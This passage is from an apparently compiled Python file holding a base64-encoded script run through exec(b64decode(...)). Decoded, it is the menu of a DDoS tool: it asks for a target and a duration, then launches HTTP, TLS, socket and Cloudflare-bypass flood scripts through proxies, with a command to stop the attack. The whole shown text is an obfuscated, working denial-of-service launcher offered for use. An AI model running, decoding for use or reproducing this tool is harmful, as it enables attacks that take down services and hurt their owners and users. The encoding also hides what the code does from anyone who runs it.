Mge3RhcmdldH0ge2Zsb29kdGltZX0gbnVsbC14IHt0aHJlYWR9J10sIHNoZWxsPVRydWUpCgkJCWV4Y2VwdDoKCQkJCXByaW50KCJFcnJvciB0cnkgYWdhaW4iKQoJCWVsaWYgIG1ldGhvZHMgaW4gWyJDUklOR0UiLCAiY3JpbmdlIl06CgkJCXRyeToKCQkJCXRhcmdldCA9IGlucHV0KCJbWF0gVGFyZ2V0OiAiKQoJCQkJZmxvb2R0aW1lID0gaW50KGlucHV0KCJbWF0gVGltZTogIikpCgkJCQlnZXRwcm94eSgpCgkJCQlydW4oW2Ync2NyZWVuIC1kbSBub2RlIHV0aWxzL2NyaW5nZSB7dGFyZ2V0fSB7Zmxvb2R0aW1lfSAyJ10sIHNoZWxsPVRydWUpCgkJCWV4Y2VwdDoKCQkJCXByaW50KCJFcnJvciB0cnkgYWdhaW4iKQoJCWVsaWYgIG1ldGhvZHMgaW4gWyJHRVQtRkxPT0QiLCAiZ2V0LWZsb29kIl06CgkJCXRyeToKCQkJCXRhcmdldCA9IGlucHV0KCJbWF0gVGFyZ2V0OiAiKQoJCQkJZmxvb2R0aW1lID0gaW50KGlucHV0KCJbWF0gVGltZTogIikpCgkJCQlnZXRwcm94eSgpCgkJCQlydW4oW2Ync2NyZWVuIC1kbSBub2RlIHV0aWxzL2h0dHBzIEdFVCB7dGFyZ2V0fSB1dGlscy9odHRwLnR4dCB7Zmxvb2R0aW1lfSA2NCAxJ10sIHNoZWxsPVRydWUpCgkJCWV4Y2VwdDoKCQkJCXByaW50KCJFcnJvciB0cnkgYWdhaW4iKQoJCWVsaWYgIG1ldGhvZHMgaW4gWyJIVFRQLVNPQ0tFVCIsICJodHRwLXNvY2tldCJdOgoJCQl0cnk6CgkJCQl0YXJnZXQgPSBpbnB1dCgiW1hdIFRhcmdldDogIikKCQkJCWZsb29kdGltZSA9IGludChpbnB1dCgiW1hdIFRpbWU6ICIpKQoJCQkJZ2V0cHJveHkoKQoJCQkJcnVuKFtmJ3NjcmVlbiAtZG0gbm9kZSB1dGlscy9zb2NrZXQge3RhcmdldH0gdXRpbHMvaHR0cC50eHQge2Zsb29kdGltZX0gMjAwJ10sIHNoZWxsPVRydWUpCgkJCWV4Y2VwdDoKCQkJCXByaW50KCJFcnJvciB0cnkgYWdhaW4iKQoJCWVsaWYgIG1ldGhvZHMgaW4gWyJDRi1LSUxMIiwgImNmLWtpbGwiXToKCQkJdHJ5OgoJCQkJdGFyZ2V0ID0gaW5wdXQoIltYXSBUYXJnZXQ6ICIpCgkJCQlmbG9vZHRpbWUgPSBpbnQoaW5wdXQoIltYXSBUaW1lOiAiKSkKCQkJCWdldHByb3h5KCkKCQkJCXJ1bihbZidzY3JlZW4gLWRtIG5vZGUgdXRpbHMvY2ZraWxsIHt0YXJnZXR9IHtmbG9vZHRpbWV9IDEnXSwgc2hlbGw9VHJ1ZSkKCQkJZXhjZXB0OgoJCQkJcHJpbnQoIkVycm9yIHRyeSBhZ2FpbiIpCgkJZWxpZiAgbWV0aG9kcyBpbiBbIlRMUyIsICJ0bHMiXToKCQkJdHJ5OgoJCQkJdGFyZ2V0ID0gaW5wdXQoIltYXSBUYXJnZXQ6ICIpCgkJCQlmbG9vZHRpbWUgPSBpbnQoaW5wdXQoIltYXSBUaW1lOiAiKSkKCQkJCWdldHByb3h5KCkKCQkJCXJ1bihbZidzY3JlZW4gLWRtIG5vZGUgdXRpbHMvdGxzLmpzIHt0YXJnZXR9IHtmbG9vZHRpbWV9J10sIHNoZWxsPVRydWUpCgkJCWV4Y2VwdDoKCQkJCXByaW50KCJFcnJvciB0cnkgYWdhaW4iKQoJCWVsaWYgbWV0aG9kcyBpbiAiIjoKCQkJcGFzcwoJCWVsaWYgbWV0aG9kcyBpbiBbImNsZWFyIiwgIkNMRUFSIiwgImNscyIsICJDTFMiXToKCQkJT1NjbGVhcigpOyBtZXRob2RiYW5uZXIoKQoJCWVsaWYgbWV0aG9kcyBpbiBbInN0b3AiLCAiU1RPUCJdOgoJCQlydW4oWyJwa2lsbCBzY3JlZW4iXSwgc2hlbGw9VHJ1ZSkKCQkJcHJpbnQoIlsrXSBBdHRhY2sgU3RvcHBlZCEiKQoJCWVsc2U6CgkJICAgcHJpbnQoIltYXSBJbnZhbGlkIE1ldGhvZCIpCgoKZGVmIGZpbGV1cGRhdGUoKToKICAgIE9TY2xlYXIoKQogICAgcHJpbnQoIiIiCuKVlOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVlwrilZEgICAgIEZJTEUgVkVSU0lPTjogXDAzM1sxOzMyOzQwbVYyIFwwMzNbMTszMTs0MG0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIOKVkQrilZEgICAgIExBU1QgVVBEQVRFOiBcMDMzWzE7MzI7NDBtRGVjZW1iZXIgNCwgMjAyMiAgIFwwMzNbMTszMTs0MG0gICAgICAgICAgICAgICAgICAgICAgIOKVkQrilZEgICAgIE5FWFQgVVBEQVRFOiBcMDMzWzE7MzI7NDBtVmlldyBvbiBteSBHSVRIVUIgIFwwMzNbMTszMTs0MG0gICAgICAgICAgICAgICAgICAgICAgIOKVkQrilZrilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZ0gICAKICAgICIiIikKICAgIHJlcGVhdGVyKCkKCmRlZiBkZXZlbG9wZXIoKToKICAgIE9TY2xlYXIoKQogICAgcHJpbnQoIiIiCuKVlOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVlwrilZEgICAgIERFVkVMT1BFUjogQU5PTlBSSVhPUiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICDilZEK4pWRICAgICBDT01QSUxFRCBTQ1JJUFRTOiBGMzRSTDNTUyAmIEFZQSAmIFZpRHVjSHVuZyAgICAgICAgICAg4pWRICAgICAgICAK4pWa4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWdCgogICAgIiIiKQogICAgcmVwZWF0ZXIoKQoKZGVmIG1haW4oKToKCXByaW50KCJbK10gQ2hlY2tpbmcgRGVwZW5kZW5jaWVzLi4uXG4iKQoJcGtncyA9IFsnc2NyZWVuJ10KCWluc3RhbGwgPSBUcnVlCglmb3IgcGtnIGluIHBrZ3M6CgkJb2sgPSB3aGljaChwa2cpCgkJaWYgb2sgPT0gTm9uZToKCQkJcHJpbnQoZiJbWF0ge3BrZ30gaXMgbm90IGluc3RhbGxlZCFcbiIpCgkJCWluc3RhbGwgPSBGYWxzZQoJCWVsc2U6CgkJCXBhc3MKCWlmIGluc3RhbGwgPT0gRmFsc2U6CgkJZXhpdChmJ1s/XSBFcnJvcj8gdHJ5OiBzaCBpbnN0YWxsLnNoJykKCWVsc2U6CgkJT1NjbGVhcigpCgkJdG9zKCkKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CgltYWluKCk=)\x03\xda\x06base64\xda\x04exec\xda\tb64decode\xa9\x00\xf3\x00\x00\x00\x00\xda\x00\xfa\x08<module>r\t\x00\x00\x00\x01\x00\x00\x00sS\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\r\x80\r\x80\r\x80\r\xd8\x00\x04\x80\x04\xd0\x05\x15\x80V\xd4\x05\x15\xf0\x00\x00\x17Yx\x04\xf1\x00\x00\x06Zx\x04\xf4\x00\x00\x06Zx\x04\xf1\x00\x00\x01[x\x04\xf4\x00\x00\x01[x\x04\xf0\x00\x00\x01[x\x04\xf0\x00\x00\x01[x\x04\xf0\x00\x00\x01[x\x04r\x07\x00\x00\x00'))